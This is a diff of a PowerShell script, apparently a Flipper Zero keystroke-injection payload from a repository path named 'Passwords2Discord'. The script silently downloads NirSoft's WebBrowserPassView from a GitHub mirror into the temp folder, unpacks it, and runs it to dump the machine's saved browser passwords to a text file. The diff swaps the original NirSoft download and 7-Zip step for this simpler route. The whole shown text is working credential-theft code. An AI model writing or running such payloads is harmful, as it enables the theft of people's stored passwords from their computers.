@@ -3,20 +3,15 @@ $ProgressPreference = "SilentlyContinue";
 New-Item -Path $env:temp -ItemType Directory -Force;
 Set-Location $env:temp;
 
-$7zurl = "https://7-zip.org/" + (Invoke-WebRequest -UseBasicParsing -Uri "https://www.7-zip.org/" | Select-Object -ExpandProperty Links | Where-Object { $_.href -like "*-x64.exe" } | Select-Object -First 1 | Select-Object -ExpandProperty href);
-Invoke-WebRequest $7zurl -OutFile "7z.exe" | Wait-Process;
-Start-Process -FilePath ".\7z.exe" -ArgumentList "/S" -Wait;
-
 $headers = @{
     "Authorization" = "Basic ZG93bmxvYWQ6bmlyc29mdDEyMyE=";
     "Referer" = "https://www.nirsoft.net/password_recovery_tools.html"
 };
 
-Invoke-WebRequest -Headers $headers -Uri https://www.nirsoft.net/protected_downloads/passreccommandline.zip -OutFile wbpv.zip | Wait-Process;
-7z e "wbpv.zip" -p"nirsoft123!" -o"wbpv" -y -Wait;
+Invoke-WebRequest -Headers $headers -Uri https://github.com/Agente404/flipper/raw/main/payloads/Passwords2Discord/wbpv.zip -OutFile wbpv.zip | Wait-Process;
 
+Expand-Archive "wbpv.zip" -DestinationPath "wbpv" | Wait-Process;
 Remove-Item "wbpv.zip" -Force;
-Remove-Item "7z.exe" -Force;
 
 Start-Process -FilePath "wbpv\WebBrowserPassView.exe" -Args "/stext wbpv\pwd.txt" -Wait;
 
